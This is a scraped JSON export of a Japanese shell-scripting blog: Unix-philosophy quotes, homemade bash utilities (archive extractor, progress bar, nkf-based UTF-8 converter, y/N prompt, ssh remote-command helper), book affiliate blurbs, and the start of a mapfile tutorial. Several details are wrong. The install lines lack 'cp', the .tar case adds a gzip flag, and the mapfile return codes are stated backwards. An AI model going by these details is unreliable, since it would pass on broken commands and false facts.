その一部、または大部分をCで書き直してパフォーマンスの向上を図ろうとする。\n「最も効率の良い方法は、\nほとんどの場合「移植性」に欠ける。」\n「移植か死か。優れたソフトウェアは移植され成長し、\nそれ以外は取り残され捨てられる。」\nDQ1カートリッジ(64kb)用のコード\n自分のプログラマ人生で最も効率の良い、そして移植の難しいコード」を書いた。\n命令をデータとして扱い、データを命令として扱った。\n走査線が画面の右端から左端に引き返すまでの間を狙って命令を実行した。\nメモリ節約のためありとあらゆる技を駆使した。\nこうしてできあがったコードは芸術品と言えるほど見事なものだった。\nフォルクスワーゲンのビートルに２０人ほど詰め込むようなものだった。\nそして保守担当者にとっては究極の悪夢でもあった。\n出力結果はASCIIフラットファイルに保存する　中間ファイルは作らない　RDBは使わない 「動かせないデータは死んだデータだ。」\n出力結果はASCIIフラットファイルに保存する。\n安易と稚拙な知識でRDBを使わない。\nむやみに中間ファイルをはき出さない。\n素晴らしいシステムは中間ファイルI/Oがゼロで、\n全てがメモリ上で稼働する。よってそこそこ高速に動く。\nソフトウェアを梃子として使う　「良いプログラマはよいコードを書く。\n偉大なプログラマは良いコードを借りてくる。」\n梃子の支点をいかに自分のほうに近づける事が出来るか\n独自技術症候群を避け、すでにあるものにクリエイティブな付加価値をつける\n独自技術症候群は創造性を伸ばさない。\n「良いプログラマはよいコードを書く。\n偉大なプログラマは良いコードを借りてくる。」\nシェルスクリプトによって梃子の効果と移植性を高める　パイプ 「私は人生で二度しか奇跡を見た事がない。\n一つは核融合、もう一つは複利だ\n少量のものを繰り返し掛け合わせていく事で、\nやがて奇跡的な規模に達する。」\nシェルスクリプトには恐ろしいほどの梃子（てこ）の効果がある\nシェルスクリプトは梃子の降下で時間も節約する\nシェルスクリプトはCより移植性が高い\n「熟練プログラマはシェルスクリプトを熱心に使う。\nあなたもまたそうするべきだ。」\n「UNIXの源流は高水準の抽象化モデル「シェルスクリプト」であり、\nそれは今も普遍である。」\n「私は人生で二度しか奇跡を見た事がない。\n一つは核融合、もう一つは複利だ\n少量のものを繰り返し掛け合わせていく事で、\nやがて奇跡的な規模に達する。」アインシュタイン\nシェルスクリプト一行はおよそ１万倍の複利を生む\necho who | awk \u0026#39;{ print $1 ; }\u0026#39; | sort | uniq | sed -e \u0026#34;s/ /, /g\u0026#34; ; echo 177 who 755 awk 3411 sort 2614 uniq 302 sed 2093 --------------------- 9.353 処理をパイプでつなぎ処理全体を一行で完結させる。\n「ひとつのことをうまくやる」の良い事例だ。\nfunction sh_func_getTitle() { TITLE=$(echo ${URLGETOPT} | \\ while read line ;do if echo \u0026#34;$line\u0026#34; | grep -i \u0026#34;title=\u0026#34; \u0026gt; /dev/null; then echo \u0026#34;$line\u0026#34; | \\ sed -e \u0026#34;s/^.*title=\\x27//g\u0026#34; \\ -e \u0026#34;s/\\x27.*$//g\u0026#34; \\ -e \u0026#34;s/\\r//g\u0026#34; \\ -e \u0026#34;s/\u0026lt;[^\u0026gt;]*\u0026gt;//g\u0026#34; \\ -e \u0026#34;s/^[●○■□△▽]//g\u0026#34;; fi done ); } 全てのプログラムをフィルタとして設計する メソッド間の入力をstdin、出力はstdoutを使用する\nオンメモリでコマンドフィルタとして稼働する。\nfunction trim(){ if [ -p /dev/stdin ]; then cat - ; else echo -n ; fi | sed -e \u0026#39;s/^ *//g\u0026#39; -e \u0026#39;s/ *$//g\u0026#39; } 実行結果\necho \u0026#34; ほげ \u0026#34; | trim ; ほげ 以下でも良い。\nfunction trim(){ awk \u0026#39;{ print $1; }\u0026#39; | sed -e \u0026#39;s/^ *//g\u0026#39; -e \u0026#39;s/ *$//g\u0026#39; \u0026lt;/dev/stdin } 実行結果\necho \u0026#34; ほげ \u0026#34; | trim ; ほげ 並行して考える 並列処理が可能なメソッドを積極的に書く\n並列処理が可能なメソッドを積極的に書く\nメソッドの並列処理\n#!/bin/bash ## # # function cmd(){ echo \u0026#34;Hello, $1!\u0026#34;; } ## # # function sh_xargs(){ export -f cmd yes | head -1000 | xargs -n1 -P4 -I % bash -c \u0026#34;cmd %\u0026#34; } ## # # sh_xargs ; 木を守る UNIXはドキュメントを忌み嫌う\nUNIXユーザーは紙のドキュメントを忌み嫌う。不要なドキュメントを出力して整理する事はしない。\nソースコードが実体であり、高水準のドキュメントとなるようプログラムする。\n【自作コマンド】圧縮ファイル自動解凍ツール 圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。\n圧縮ファイルと実行コマンド、パラメータ一覧 拡張子 パラメータ tgz | tar.gz tar zxvf tar.Z gunzip tar.bz2 tar xvfj tar tar xvfz gz gunzip Z gunzip bz2 bunzip2 zip unzip こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。\n実行例 # 圧縮ファイルを解凍する便利な unCompコマンド $ unComp comp.tar.gz2 作成 まずファイルを作ります。ファイル名は unComp とします\n# unComp というファイルを作成 $ :\u0026gt; unComp # vim で unComp を開く $ vim unComp unCompファイルに以下の内容を貼り付ける\n#!/bin/bash # #圧縮されているファイルを解凍する # unComp を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # # cp unComp /usr/local/bin/unComp # # 実行例 # $ unComp filename(圧縮ファイル) # if [ $# -ne 1 ]; then echo \u0026#34;\u0026#34; exit ; fi # case $1 in *.tgz | *.tar.gz) tar zxvf $1 ;; *.tar.Z) gunzip $1 tar xvf $( echo \u0026#34;$1\u0026#34; | sed \u0026#39;s/\\.Z$//\u0026#39;) ;; *.tar.bz2) tar xvfj $1;; *.tar) tar xvfz $1;; *.gz) gunzip $1;; *.Z) gunzip $1;; *.bz2) bunzip2 $1;; *.zip) unzip $1;; *) echo \u0026#34;ファイルの拡張子が対応していません:$1\u0026#34; esac exit ; 作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。\nwLuをつかってUTF-8に変換するとさらに便利です。\n# unComp ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu unComp \u0026gt; unComp.txt # unComp.txtをunCompにリネームします $ mv unComp.txt unComp # 作成したunCompコマンドファイルを/usr/local/bin にコピーします $ sudo unComp /usr/local/bin/ # コマンドが配置されたかを確認 $ which unComp $ /usr/local/bin/unComp 使い方 # 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する # 実行 $ unComp sample.zip 圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。\n便利ですね。\n【自作コマンド】プログレスバーの作成 ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。\n処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。\nシェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい\n使い方 処理のループ中に以下の1行を追記します。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 実行手順 以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。\n$ :\u0026gt; Progress.sh $ vim Progress.sh # vimで以下のソースコードを貼り付けて保存 # ソースコードのファイルエンコードをUTF-8に変更します。 $ nkf -wLu Progress.sh \u0026gt; Progress.sh.utf8 # ファイルエンコードを変更したファイルを元のファイル名にリネームします。 $ mv Progress.sh.utf8 Progress.sh # 実行権限を付与します $ chmod +x Progress.sh # 実行 $ ./Progress.sh ソースコード #! /bin/bash ####################################### # 進捗を表示するプログレスバー # ####################################### # # # percent $1 # GT $2 progress(){ percent=$1; GT=$2; column=`expr 71 \\* \u0026#34;$percent\u0026#34; / $GT`; nspace=`expr 71 - \u0026#34;$column\u0026#34;`; #プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入 bar=\u0026#39;\\r[\u0026#39;; #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$column\u0026#34; ];do bar=$bar\u0026#39;=\u0026#39;; # barに=を追加 set - \u0026#34;$@\u0026#34; dummy; # $#をインクリメント done bar=$bar\u0026#39;\u0026gt;\u0026#39;; #barの先端に\u0026gt;を追加 #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$nspace\u0026#34; ]; do bar=$bar\u0026#39; \u0026#39;; set - \u0026#34;$@\u0026#34; dummy; done bar=$bar\u0026#39;]\u0026#39;$percent/$GT\u0026#39;\\c\u0026#39;; # barに]と１行分のプログレスバーを表示 echo -e \u0026#34;$bar\u0026#34;; } ####################################### # メイン処理 # set count ; MAX=100 ; #最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。 # for (( i=0; i\u0026lt;$MAX; i++)){ # ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。 progress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; } echo \u0026#34;\u0026#34;; # #終了 exit ; 使い方 シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。\n自作ソースの中のループ処理の関数の頭に以下を追記します。\nMAX=100; は、処理の最大値を指定します。\n処理のループ最大数が150回であれば、以下の通りに修正します。\nset count; MAX=150; forやwhileループ処理の中に以下を埋め込みます。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 最後にforまたはwhileループを抜けた後に\necho \u0026#34;\u0026#34;; を追加します。これだけです。\n実行結果 【自作コマンド】一時ファイルを作ることなく、ファイルの文字コードと改行コードをUTF-８に変換するスクリプト。 必要なもの ネットワーク漢字フィルター nkf\n※macの場合、Homebrew が必要になります。\nnkf インストールの手順 まず、nkfがインストールされているかを確認します。\n$ which nkf /usr/local/bin/nkf インストールされていない場合、macの場合はbrewでインストールします。\n$ brew install nkf インストールしようとすると以下のエラーが出ることがあります\nError: The `brew link` step did not complete successfully The formula built, but is not symlinked into /usr/local Could not symlink share/man/ja/man1/nkf.1 /usr/local/share/man/ja/man1 is not writable. 権限周りを下記のコマンドを打って変更します。\nsudo chmod 775 /usr/local/share/man/ja/man1 sudo chown \u0026lt;ユーザ名\u0026gt;:admin /usr/local/share/man/ja/man1 コマンドを確認します。\n$ nkf -v Network Kanji Filter Version 2.1.5 (2018-12-15) Copyright (C) 1987, FUJITSU LTD. (I.Ichikawa). Copyright (C) 1996-2018, The nkf Project. 使い方 nkfコマンドとは？\n「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式\nnkf オプション ファイル名\nUTF-8に変換する場合は、オプションに wLu をつけて変換します。\n$ nkf -wLu isofile.txt \u0026gt; utf8.txt 変換の流れ（手動編） 元ファイル moto.txt (UTF-8以外のファイルエンコード、改行コード）\n↓\n変換後のファイル ato.txt(UTF-8に変換したファイル）\n↓\n変換後のファイルをリネームする\n# UTF-8に変換 $ nkf -wLu moto.txt \u0026gt; ato.txt # 変換後のファイルを元のファイル名にリネームする $ mv ato.txt moto.txt # vimiでファイルエンコードを確認する $ vim moto.txt 面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。\n変換の流れ（自動編） # UTF-8に変換 wLu コマンドをこれから自作 # その後・・・ $ wLu moto.txt ← 一時ファイルすら作る必要なし $ vim moto.txt ← UTF-8 に変換されている！ コマンドの内容 まずファイルを作ります。ファイル名は wLu とします\n# wLu というファイルを作成 $ :\u0026gt; wLu # vim で wLu を開く $ vim wLu 以下の内容をファイルに貼り付ける\n#!/bin/bash ################################################# # パラメータで渡されたファイル名をutf8に変換する # # 使い方 # wLu UTF-8に変換したいファイル名 # wLu を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # ################################################# # filename=\u0026#34;$1\u0026#34; ; # function wLu(){ if [ -f \u0026#34;$filename\u0026#34; ]; then cat \u0026#34;$filename\u0026#34; | nkf -wLu \u0026gt; \u0026#34;$filename\u0026#34;.u ; mv \u0026#34;$filename\u0026#34;.u \u0026#34;$filename\u0026#34; ; fi } # if ! which nkf \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then echo \u0026#34;nkf がありません\u0026#34; ; echo \u0026#34;nkf をインストールして下さい\u0026#34; ; exit ; fi # if [ -z \u0026#34;$filename\u0026#34; ] ; then echo \u0026#34;第一引数にファイル名を指定して下さい\u0026#34; echo \u0026#34;実行例： wLu filename\u0026#34; ; exit ; fi # 実行 wLu ; # 終了 exit ; 作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。\n# wLu ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu wLu \u0026gt; wLu.txt # wLu.txtをwLuにリネームします $ mv wLu.txt wLu # 作成したwLuコマンドファイルを/usr/local/bin にコピーします $ sudo wLu /usr/local/bin/ # コマンドが配置されたかを確認 $ which wLu $ /usr/local/bin/wLu 使い方 # UTF-8以外のファイルエンコードファイル $ cat moto.txt $ wLu moto.txt 変換結果を一時ファイルにし、リネームする手間が省けます。\n便利ですね。\n【自作】BASHシェルスクリプトで「キー入力待ち」プロンプトを実装する 説明も何もよくみるあれです。\n実行しますか？ （y or N): 何かを押せば処理を続けたい場合 キーボードの入力さえあれば次に進むパターンもおなじみですね。\nread -p \u0026#34;なにかキーを押してください\u0026#34; yを押せば処理を続け、Nでabort（終了）したい場合 これは覚えておくなりメモしておいたほうが良さそうです。\nyを押せば次に進むし、Nであれば処理はabortします。\nread -p \u0026#34;ok? (y/N): \u0026#34; yn case \u0026#34;$yn\u0026#34; in [yY]*) ;; *) echo \u0026#34;abort.\u0026#34; ; exit ;; esac 【自作コマンド】sshでサーバーにログインしてコマンドを実行後、自動的にログアウトしてローカルに戻ってくる方法 sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。\nイメージ 従来の方法\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 ↓ Linuxサーバーをログアウト ローカルＰＣにもどる これからつくるBash/ssh\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 Linuxサーバーをログアウト ↓ ローカルＰＣのターミナルにもどる わかりにくいですか？\nまず、メリットとしてサーバーでコマンドからログアウトする必要がありません。\nこれができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを\n順番に訪ね歩きファイルに出力する事も可能です。\n以下、ソースです。\n#!/usr/bin/bash ############################################## # sshでサーバーにログインして、なんらかのコマンドを # 実行しターミナルに表示、ミッション終了後、ターミ # ナルを自動的にログアウトしてローカルに何事もなか # ったかのようにもどってくる最も簡単シェルスクリプト ############################################## # # サーバーのＩＰアドレスとか SERVER=\u0026#34;centos@xx.xx.xx.xxx\u0026#34; # 実行したいコマンドを \u0026amp;\u0026amp; でつなぐ COMMAND=\u0026#34;uptime \u0026amp;\u0026amp; df -h\u0026#34;; echo \u0026#34;centosサーバーログイン\u0026#34;; # ポイントは -t です。 ssh $SERVER -t $COMMAND; echo \u0026#34;centosサーバーログアウト\u0026#34;; exit; たったこれだけですが、この工夫により多くのサーバーを\nスクリプトで一括回遊することができます。 お試しあれ。\n【自作コマンド】シェルスクリプトで「キー入力待ち」プロンプトを実装する 説明も何もよくみるあれです。\n実行しますか？ （y or N): 何かを押せば処理を続けたい場合 キーボードの入力さえあれば次に進むパターンもおなじみですね。\nread -p \u0026#34;なにかキーを押してください\u0026#34; yを押せば処理を続け、Nでabort（終了）したい場合 これは覚えておくなりメモしておいたほうが良さそうです。\nyを押せば次に進むし、Nであれば処理はabortします。\nread -p \u0026#34;ok? (y/N): \u0026#34; yn case \u0026#34;$yn\u0026#34; in [yY]*) ;; *) echo \u0026#34;abort.\u0026#34; ; exit ;; esac 「ざっくり」シリーズのご紹介 【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】\nhttps://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/\n【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】\nhttps://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n【ターミナルTIPS】ターミナルで知っておくとちょっとだけ便利なコマンド\nhttps://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/\n【名著紹介】「ＵＮＩＸという考え方」ご紹介\nhttps://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/\n【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０\nhttps://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/\n【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９\nhttps://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/\n【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８\nhttps://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/\n【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-02-01T13:08:01+09:00","image":"https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/","title":"シェルスクリプト１０００本ノック"},{"content":"BASHシェルスクリプトで「キー入力待ち」プロンプトを実装する 説明も何もよくみるあれです。\n実行しますか？ （y or N): 何かを押せば処理を続けたい場合 キーボードの入力さえあれば次に進むパターンもおなじみですね。\nread -p \u0026#34;なにかキーを押してください\u0026#34; yを押せば処理を続け、Nでabort（終了）したい場合 これは覚えておくなりメモしておいたほうが良さそうです。\nyを押せば次に進むし、Nであれば処理はabortします。\nread -p \u0026#34;ok? (y/N): \u0026#34; yn case \u0026#34;$yn\u0026#34; in [yY]*) ;; *) echo \u0026#34;abort.\u0026#34; ; exit ;; esac 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-01-20T10:22:00+09:00","image":"https://suzukiiichiro.github.io/posts/2023-01-20-01-okyesno-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-01-20-01-okyesno-suzuki/","title":"BASHシェルスクリプトで「キー入力待ち」処理を作ってみよう"},{"content":"mapfile（マップファイル） bash シェルの mapfile コマンドは、読み取り配列としてよく知られています。\n主な目的は、標準入力行を読み取り、それらをインデックス付き配列変数に格納することです。\nmapfile は、パイプではなく置換 (\u0026lt;) から読み取る必要があります。\nさらに、読み取りループと比較して、mapfile ははるかに高速で便利なソリューションです。\nコマンドの実行が成功した場合は 1 を返し、失敗した場合は 0 を返します。\n配列名を指定しない場合、mapfile 変数がデフォルトの配列変数となります。\nデータテキストの準備 ここで簡単なデータテキスト用意します。\nOne Two Three 普通のやり方 while read パターン このテキストを読み込んで配列にデータを格納したいと思います。\n多少冗長ではありますが通常は以下のような感じになります。\n#!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 declare -i COUNT=0; # カウンターの宣言 IFS=$\u0026#39;\\n\u0026#39;; # 区切り文字を改行コードに指定 while read line;do # １行ずつ読み込んだ内容 $line を配列に代入 aLine[$COUNT]=\u0026#34;$line\u0026#34;; ((COUNT++)); # インクリメント done\u0026lt;$DATAFILE # ファイルの入力 echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash array01.sh 配列の内容すべてを表示 One 